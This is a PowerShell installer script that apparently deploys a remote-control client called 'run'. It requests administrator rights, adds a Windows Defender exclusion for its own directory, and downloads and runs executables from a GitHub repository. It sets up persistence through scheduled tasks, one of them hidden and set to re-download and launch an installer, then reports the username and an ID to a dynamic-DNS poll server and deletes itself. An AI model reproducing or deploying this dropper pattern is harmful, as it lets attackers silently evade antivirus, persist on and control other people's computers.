$ErrorActionPreference = "Continue"

function Log($text) {
  Write-Host $text
}

Log "01 Starting installer"

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
Log "02 VPS poll URL configured"

$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"

$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

Log "03 Paths configured"
Log "04 Installer path: $installer"
Log "05 Run path: $runExe"

$isUpdate = Test-Path $datFile
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

Log "06 Existing installation: $isUpdate"
Log "07 Administrator: $isAdmin"

if (-not $isUpdate -and -not $isAdmin) {
  Log "08 Fresh install requires administrator privileges"
  Log "09 Requesting UAC"
  Start-Process -FilePath $self -Verb RunAs
  Log "10 UAC process started"
  Read-Host "Press Enter to close"
  exit
}

if (-not $isUpdate) {
  Log "11 Adding Defender exclusion"
  Add-MpPreference -ExclusionPath $runDir | Out-Null
  Log "12 Defender exclusion operation finished"
}
else {
  Log "11 Existing installation detected, skipping Defender exclusion"
}

if (-not (Test-Path $datDir)) {
  Log "13 Creating data directory"
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}
else {
  Log "13 Data directory already exists"
}

Log "14 Creating TEMP directory"
New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null

Log "15 Creating installer directory"
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Log "16 Stopping existing run process"
Get-Process -Name "run" | Stop-Process -Force | Out-Null

Log "17 Creating run directory"
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

Log "18 Checking latest GitHub commit"

try {
  $apiResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" -UseBasicParsing
  $latestCommit = $apiResponse.sha
  Log "19 Latest commit: $latestCommit"
}
catch {
  $latestCommit = "main"
  Log "19 Failed to get latest commit, using main"
}

Log "20 Downloading run.exe"
Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" -OutFile $runExe -UseBasicParsing

if (Test-Path $runExe) {
  Log "21 run.exe downloaded successfully"
}
else {
  Log "21 ERROR: run.exe was not downloaded"
}

Log "22 Downloading ss_installer.ps1"
Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_installer.ps1" -OutFile $installer -UseBasicParsing

if (Test-Path $installer) {
  Log "23 ss_installer.ps1 downloaded successfully"
}
else {
  Log "23 ERROR: ss_installer.ps1 was not downloaded"
}

if (-not (Test-Path $runExe) -or -not (Test-Path $installer)) {
  Log "24 ERROR: Required files are missing, exiting"
  exit
}

Log "25 Required files verified"

$taskName = "WinRun"

Log "26 Creating WinRun scheduled task action"
$action = New-ScheduledTaskAction -Execute $runExe -WorkingDirectory $runDir

Log "27 Creating WinRun logon trigger"
$trigger = New-ScheduledTaskTrigger -AtLogOn

Log "28 Creating WinRun settings"
$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

$installerTaskName = "WinRunInstaller"

Log "29 Creating installer task command"
$cmd = 'powershell.exe -Command "$p=\"$env:APPDATA\run\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o=\"$p\installer.exe\"; Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; Start-Process $o"'

Log "30 Creating installer scheduled task action"
$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument " -Command $cmd"

Log "31 Creating installer task settings"
$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
  -Hidden

Log "32 Registering WinRun scheduled task"
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

Log "33 Registering WinRunInstaller scheduled task"
Register-ScheduledTask -TaskName $installerTaskName -Action $installerAction -Settings $installerSettings -RunLevel Highest -Force | Out-Null

Log "34 Scheduled tasks registered"

Log "35 Running ss_installer.ps1"
Start-Process powershell.exe -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'" -Wait

Log "36 ss_installer.ps1 finished"

Log "37 Saving installed commit"
$latestCommit | Out-File $datFile

if (Test-Path $datFile) {
  Log "38 Install marker saved"
}
else {
  Log "38 ERROR: Install marker was not saved"
}

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

Log "39 Checking client ID"

if (Test-Path $IdPath) {
  Log "40 Existing client ID found"

  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
    Log "41 Client ID loaded"
  }
  else {
    $uniqueId = $raw
    Log "41 Short client ID loaded"
  }
}
else {
  Log "40 Client ID does not exist"
  Log "41 Generating new client ID"

  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId

  Log "42 Client ID saved"
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

Log "43 Client username: $uniqueUser"

try {
  Log "44 Registering client with VPS"

  $registerUrl = "$VPS_POLL_URL?username=$uniqueUser"
  Invoke-RestMethod -Method Get -Uri $registerUrl | Out-Null

  Log "45 Client registration request succeeded"
}
catch {
  Log "45 ERROR: Client registration request failed"
  Log "46 Error: $($_.Exception.Message)"
}

Log "47 Starting run.exe"
Start-Process $runExe

Log "48 run.exe start command sent"

if ($installer) {
  Log "49 Scheduling installer cleanup"
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force`""
}

if ($self) {
  Log "50 Scheduling installer self cleanup"
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`""
}

Log "51 Installation process finished"
Read-Host "Press Enter to close"
